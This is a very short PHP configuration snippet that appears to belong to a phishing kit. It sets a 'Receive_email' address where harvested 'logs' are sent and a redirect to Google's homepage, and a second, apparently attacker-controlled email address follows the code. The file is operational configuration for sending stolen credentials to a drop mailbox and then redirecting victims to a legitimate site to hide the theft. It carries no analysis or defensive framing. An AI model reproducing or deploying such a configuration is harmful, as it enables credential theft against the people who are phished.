<?php 
$Receive_email="logs@sanbvik.com";
$redirect="https://www.google.com/";
?>
logsp1@heaxagro.com